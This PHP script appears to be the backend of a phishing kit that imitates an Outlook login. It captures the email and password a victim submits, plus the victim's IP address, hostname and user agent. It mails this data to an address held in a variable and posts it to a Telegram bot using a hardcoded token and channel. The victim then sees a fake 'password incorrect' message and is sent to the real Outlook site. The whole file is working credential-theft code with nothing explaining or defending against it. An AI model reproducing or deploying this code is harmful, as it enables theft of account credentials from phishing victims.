<?php
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');
?>
<?php
$redirect="https://outlook.live.com/";
  
  $apiToken = "5557966069:AAGvhAwYnmlkL0_zw00mU3N0Dlin21hCrVU";
$email = $_POST['email'];
$password = $_POST['password'];
      
   $ip = getenv("REMOTE_ADDR");
      $hostname = gethostbyaddr($ip);
      $useragent = $_SERVER['HTTP_USER_AGENT'];
      $message .= "------------------------<br>\n";
      
      $message .= "Email            : ".$email."<br>\n";
      $message .= "password             : ".$password."<br>\n";
      $message .= "----------------------------------<br>\n";
      $message .= $ip."<br>\n";
      $message .= "--- http://www.geoiptool.com/?IP=$ip ----<br>\n";
      $message .= $useragent."<br>\n";
      $message .= "-----------------------<br>\n";
      $send = $Receive_email;
      $subject = "Login : $ip";
         mail($send, $subject, $message); 
   
         $data = [
          'chat_id' => '@scarfazebase',
          'text' => $message
      ];
         $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
      $signal = 'ok';
   $msg = 'Your account or password is incorrect. If you don\'t remember your password';
      
   $data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

   ?>